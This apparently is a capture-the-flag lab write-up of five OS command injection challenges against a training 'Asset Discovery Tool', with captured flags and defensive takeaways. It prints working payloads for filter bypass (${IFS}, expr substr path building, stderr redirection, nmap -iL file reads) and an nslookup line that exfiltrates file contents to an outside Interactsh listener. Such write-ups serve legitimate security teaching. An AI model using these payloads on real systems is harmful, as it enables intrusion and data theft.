# Command Injection (CVE-2021-44228 Explained - web_security - 0x09_command_injection)

**Target Machine:** Cyber - WebSec 0x09 (`web0x09.hbtn`)
**Repo path:** `web_application_security/0x09_command_injection`

This project covers a progressive series of OS Command Injection challenges built around an "Asset Discovery Tool" — a web application that passes user-supplied input directly to system commands (ping, nmap) without adequate sanitization. Each task adds a new layer of defense, and each layer is bypassed using a different technique, building from basic injection all the way to blind exfiltration and GTFOBins abuse.

---

## Task 0 — Basic Command Injection

**Title:** Basic OS Command Injection via Semicolon Separator
**Endpoint:** `http://web0x09.hbtn/app1/`
**Flag Location:** `/0-flag.txt`
**Flag:** `FLAG_0 1a4b130bc21376acc23e85dcb77db4a4`

### The setup

The app pings a user-supplied domain and returns the full output. Baseline test with `google.com` confirmed genuine ping command output (real ICMP stats), confirming the backend shells out to the system `ping` binary rather than simulating it. That's the classic setup for OS command injection.

### The vulnerability

The backend builds a shell command like `ping -c 1 <user_input>` and executes it directly. Since user input isn't sanitized in any way, a semicolon (`;`) terminates the ping command and lets a second arbitrary command be appended and executed by the same shell process.

### The exploit

**Step 1 — Confirm injection:**
```
google.com; id
```
Output included `uid=999(lab01) gid=999(lab01) groups=999(lab01)` — confirming arbitrary command execution as the `lab01` user.

**Step 2 — Read the flag:**
```
google.com; cat /0-flag.txt
```

### Why it worked

No filtering of any kind was present. The semicolon is a standard shell command separator — the shell sees `ping -c 1 google.com` followed by `cat /0-flag.txt` as two separate commands and executes both in sequence, returning both outputs to the user. The flag appeared cleanly in the response.

---

## Task 1 — Filtered Command Injection (Space & `cat` Blacklist Bypass)

**Title:** Bypassing Space and Command Blacklists via `${IFS}` and Command Substitution
**Endpoint:** `http://web0x09.hbtn/app2/`
**Flag Location:** `/etc/1-flag.txt`
**Flag:** `FLAG_1 5349dae85e738ef30c3a22ba16253c5b`

### The setup

The app added a blacklist filter returning `Domain contains forbidden characters or commands` for blocked input. The task hint said to bypass both a space filter and a command-name check.

### Step 1 — Confirm injection still works (no space)

```
google.com;id
```

Output: `uid=998(lab02) gid=998(lab02) groups=998(lab02)` — confirmed. Semicolon and `id` are both allowed, and no space is needed between `;` and the command.

### Step 2 — Attempt the flag directly — blocked

```
google.com;cat${IFS}/etc/1-flag.txt
```

`Domain contains forbidden characters or commands` — two problems identified: `cat` is a blacklisted command name, and the space character is blacklisted (requiring `${IFS}` as a substitute). Even with `${IFS}` for the space, `cat` itself was the remaining blocker.

### Step 3 — Substitute `head` for `cat`

```
google.com;head${IFS}/etc/1-flag.txt
```

✅ Flag returned cleanly.

### The bypasses explained

**Space bypass — `${IFS}`:**
`$IFS` is the shell's Internal Field Separator variable, which by default contains a space character. Wrapping it in `${}` allows it to be expanded inline wherever a space is needed, without ever typing a literal space. The filter checks for literal spaces but doesn't account for shell variable expansion.

**`cat` bypass — `head`:**
The blacklist checked for specific command names. Substituting `head` (which reads and prints file contents identically to `cat` for small files) bypassed the name-based check entirely.

### Why it worked

The filter was a naive blacklist of specific characters and command names. It never accounted for shell variable expansion as a space substitute (`${IFS}`) or alternative commands performing identical functions (`head` instead of `cat`). Blacklisting specific patterns rather than enforcing a whitelist of allowed inputs always leaves gaps.

---

## Task 2 — Slash-Blacklist Bypass Using `$HOME` Substring Extraction

**Title:** Filterless Path Construction: Slash-Free Injection via `$HOME` and `expr substr`
**Endpoint:** `http://web0x09.hbtn/app3/`
**Flag Location:** `/var/2-flag.txt`
**Flag:** `FLAG_2 d8f7b4b4e0b94a9a34cefc2d6f6ab9c3`

### The setup

The blacklist was extended further — now blocking spaces, `cat`, **and the slash character `/`**. Without slashes, absolute file paths like `/var/2-flag.txt` cannot be typed directly. The task hint said to construct the path using the `HOME` environment variable.

### Why `$HOME` contains the answer

The server's `$HOME` variable evaluates to `/home/lab03` — a string whose first character is `/`. If that first character can be extracted without typing a literal slash, it can be reused to build any absolute path.

### What was tried and why each approach failed

**Bash-style `${HOME:0:1}`:**
Failed with `/bin/sh: 1: Bad substitution` — the backend shell is `sh`/`dash`, not bash. Dash doesn't support bash-style substring slicing syntax.

**POSIX nested parameter expansion `${HOME%${HOME#?}}`:**
Blocked with "Attack detected" — the WAF flagged nested `${...${...}...}` expressions as suspicious.

**`%` operator in isolation `${HOME%3}`:**
Blocked — the `%` character itself is blacklisted entirely, separate from the nesting issue.

**Pipe character `|` — e.g. `echo $HOME | cut -c1`:**
Blocked — the `|` pipe character is blacklisted.

**Chaining more than two `;`-separated commands:**
Blocked — the WAF flagged long chains of semicolon-separated commands.

### The solution — `expr substr`

```
$(expr${IFS}substr${IFS}$HOME${IFS}1${IFS}1)
```

`expr substr STRING POSITION LENGTH` extracts a substring using a standalone external command — no bash-specific syntax, no nested `${}`, no `%`, no pipes. `substr $HOME 1 1` extracts position 1, length 1 from `$HOME`, returning `/`.

`expr substr` sidesteps every blocker: it's a single external command, uses no shell-level nesting, no `%`, no `|`, and needs only one semicolon to chain onto the ping.

### The exploit

```
google.com;head${IFS}$(expr${IFS}substr${IFS}$HOME${IFS}1${IFS}1)var$(expr${IFS}substr${IFS}$HOME${IFS}1${IFS}1)2-flag.txt
```

**Piece by piece:**

- `;` — chains a second command onto the ping
- `head` — reads and prints file contents (blacklisted `cat` substitute)
- `${IFS}` — substitutes for literal spaces (space character blacklisted)
- `$(expr${IFS}substr${IFS}$HOME${IFS}1${IFS}1)` — extracts the first character of `$HOME` (`/home/lab03`), returning `/`. Used **twice** — once before `var` and once before `2-flag.txt` — assembling the full path `/var/2-flag.txt` without a single literal slash anywhere in the payload
- The `$(...)` wraps the `expr` call in command substitution, so the shell runs `expr` first and drops its output (`/`) directly into the command line before execution

### Why it worked

`expr substr` is a POSIX-compliant external command available in both bash and dash, requiring no shell-level nesting or special characters. Since `$HOME` on this server is `/home/lab03`, its first character is `/` — generated purely from an environment variable, never typed by hand, and completely invisible to a filter looking for literal slash characters.

---

## Task 3 — Blind Command Injection via DNS Exfiltration (Interactsh OOB)

**Title:** Blind Command Injection via DNS Exfiltration (Interactsh OOB)
**Endpoint:** `http://web0x09.hbtn/app4/`
**Flag Location:** `/var/www/3-flag.txt`
**Flag:** `FLAG_3 07cb81a2cfab6515db36fc46f08ad191`

### The setup

This task introduced **blind command injection** — the app no longer reflects command output to the user ("only trusted admins see results"). The injection still works, but there's no way to read results directly on screen via normal stdout. Out-of-band exfiltration is required.

### Why DNS exfiltration works

DNS is a protocol that virtually every server uses constantly and almost never blocks outbound — even heavily firewalled servers need it to resolve hostnames. `nslookup <hostname>` generates a real DNS query that travels over the public internet. By embedding the flag content as a subdomain of a listener domain, the flag is transmitted *inside a DNS lookup* rather than over HTTP — completely bypassing the fact that HTTP output is hidden.

**Interactsh** (`app.interactsh.com`) is a free, public out-of-band interaction server that logs every DNS query hitting any subdomain of a unique listener domain it generates. It's reachable from anywhere with internet access, sidestepping any VPN routing issues between the attacker machine and the target server.

### Step 1 — Confirm the DNS channel

```
google.com;nslookup${IFS}test.gpnjerjxkbmgufkckzgk8b0r0okf2s7a3.oast.fun
```

The Interactsh page showed a DNS interaction — confirming the target server has outbound internet access and `nslookup` is not blacklisted.

### Step 2 — Exfiltrate the flag via DNS subdomain

**First attempt — missing `${IFS}`:**
```
google.com;nslookup$(head${IFS}-1${IFS}/var/www/3-flag.txt).gpnjerjxkbmgufkckzgk8b0r0okf2s7a3.oast.fun
```
Failed with `/bin/sh: 1: nslookupFLAG_3: not found` — without `${IFS}` between `nslookup` and `$(...)`, the shell concatenated them as one word and tried to execute `nslookupFLAG_3...` as a single command name.

**Corrected payload:**
```
google.com;nslookup${IFS}$(head${IFS}-1${IFS}/var/www/3-flag.txt).gpnjerjxkbmgufkckzgk8b0r0okf2s7a3.oast.fun
```

The Interactsh page showed the flag value as the subdomain prefix:
`07cb81a2cfab6515db36fc46f08ad191.gpnjerjxkbmgufkckzgk8b0r0okf2s7a3.oast.fun`

DNS subdomains can't contain spaces or colons, so the `FLAG_3` label was stripped — only the hash appeared.

### Step 3 — Clean reflection via stderr redirect

```
google.com;head${IFS}-1${IFS}/var/www/3-flag.txt>&2
```

Output:
```
FLAG_3 07cb81a2cfab6515db36fc46f08ad191
```

### Why `>&2` worked

The app suppresses **stdout** (file descriptor 1) to hide command results from non-admin users. **stderr** (file descriptor 2) — the error output stream — was left completely unfiltered and passed straight through to the displayed response. This is a very common pattern in web apps that run shell commands: developers think about suppressing the "normal" output of commands, but forget that error output is a separate stream entirely.

`>&2` redirects stdout to stderr — so `head`'s output travels through the unguarded error channel instead of the suppressed normal output channel, appearing cleanly on screen.

**The key insight:** the app's "blind" output suppression was only half-implemented — it blocked one stream (stdout) but left the other (stderr) completely open.

---

## Task 4 — nmap GTFOBins File Read + Command Injection with stderr Redirect

**Title:** nmap GTFOBins File Read + Command Injection with stderr Redirect
**Endpoint:** `http://web0x09.hbtn/app5/`
**Flag Location:** `/bin/4-flag.txt`
**Flag:** `FLAG_4 12e197bd77c52a9101e0aec57e2a960f`

### The setup

The app now runs nmap against a user-supplied target instead of ping. The task hint referenced GTFOBins — a curated list of Unix binaries that can be abused to bypass security restrictions. Two techniques were available: nmap's own built-in file-read capability, and classic command injection chained onto the nmap input.

### Step 1 — Baseline confirmation

Input: `127.0.0.1`

Confirmed real nmap version 7.93 running, with full output reflected. The app passes input directly as nmap arguments with no apparent sanitization.

### Step 2 — GTFOBins `-iL` file read

GTFOBins documents that `nmap -iL <file>` reads a file as a list of target hosts. When lines contain content that isn't a valid IP or hostname, nmap leaks each line through error messages in the format `Failed to resolve "<line content>"`.

Input:
```
127.0.0.1 -iL /bin/4-flag.txt
```

No command injection separator needed — nmap flags appended to the input are passed straight through to the nmap binary as additional arguments.

Output:
```
Failed to resolve "FLAG_4".
Failed to resolve "12e197bd77c52a9101e0aec57e2a960f".
```

The flag was present but split across two lines — nmap parsed the file line by line and treated the space between `FLAG_4` and the hash as two separate hostnames to resolve, fragmenting the value.

### Step 3 — Clean reflection via command injection + stderr redirect

```
127.0.0.1;head${IFS}/bin/4-flag.txt>&2
```

Output:
```
FLAG_4 12e197bd77c52a9101e0aec57e2a960f
```

- `;` chains a second shell command onto the nmap input
- `head` reads the flag file directly (not blacklisted)
- `${IFS}` substitutes for spaces (space character blacklisted)
- `>&2` redirects stdout to stderr, bypassing any output suppression

`head` reads the file as-is and outputs it in one shot, unlike nmap's `-iL` which parses line content word by word — giving a clean, unfragmented result on a single line.

### Key takeaways

Two completely different techniques were available to read this flag:

1. **GTFOBins abuse** — nmap's own `-iL` flag was turned against the app, using nmap's built-in file parsing to leak content through its own error messages. No command injection separator needed at all — nmap flags appended to the input are just treated as additional nmap arguments. This is "living off the land": using the tool's own documented features to do something the developer never intended.

2. **Classic command injection + stderr redirect** — chaining a separate shell command via `;` and redirecting its output to stderr to bypass output suppression, exactly reusing the technique from Task 3.

The GTFOBins route was the "intended" technique, but produced fragmented output due to nmap's line/word parsing. The stderr redirect produced the cleanest result.

---

## General Patterns Observed Across This Project

1. **Blacklists fail against substitution.** Every blacklist in this project blocked specific characters or command names, but could be bypassed by substituting equivalent constructs — `${IFS}` for spaces, `head` for `cat`, `expr substr` for slash extraction. Whitelisting allowed characters is the only reliable defense.

2. **Living off the land (GTFOBins).** Legitimate system binaries often have built-in features that can be abused far beyond their intended purpose. nmap's `-iL` flag was designed for scanning host lists from files, not reading arbitrary files — but it does exactly that as a side effect.

3. **Stdout suppression ≠ output suppression.** Hiding command output by filtering stdout while leaving stderr unguarded is a half-measure. `>&2` trivially redirects any command's output from the suppressed stream to the unguarded one.

4. **DNS is the universal exfiltration channel.** Even when HTTP output is completely hidden, DNS queries almost always succeed outbound. Embedding data as subdomains of a listener domain (via Interactsh) is a reliable technique for extracting data from blind injection scenarios.

5. **Isolation before exploitation.** Each filter bypass was discovered by testing one variable at a time — confirming what was blocked vs. allowed before combining techniques. Sending complex payloads without first understanding the filter's exact rules wastes time and obscures which element is causing a block.
